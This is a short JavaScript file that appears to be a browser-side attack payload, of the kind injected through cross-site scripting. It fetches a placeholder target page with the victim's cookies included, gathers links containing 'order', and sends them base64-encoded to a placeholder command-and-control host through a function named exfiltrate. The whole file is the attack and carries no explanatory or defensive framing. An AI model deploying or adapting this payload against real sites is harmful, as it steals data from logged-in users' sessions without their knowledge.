function to_base64(str) {
  const utf8_bytes = new TextEncoder().encode(str);
  return btoa(String.fromCharCode(...utf8_bytes));
}

function search_urls(doc, query) {
  const matching_links = doc.querySelectorAll(query);
  return Array.from(matching_links).map(a => a.href);
}

function convert_to_dom(html_text) {
  const parser = new DOMParser();
  const doc = parser.parseFromString(html_text, 'text/html');
  return doc;
}

async function exfiltrate(data) {
  await fetch('http://<C2_URL>?data=' + to_base64(data));
}

(async () => {
  const target_url = 'http://<TARGET_URL>';
  
  try {
    let response = await fetch(target_url, { credentials: "include" });
    let html_text = await response.text();
    let doc = convert_to_dom(html_text);

    // this example search for urls containing the word order.
    let found_urls = search_urls(doc, 'a[href*="order"]');
    await exfiltrate(`[${target_url}] => [${found_urls.toString()}]\n`);

  } catch (e) { console.log(e) }
})();
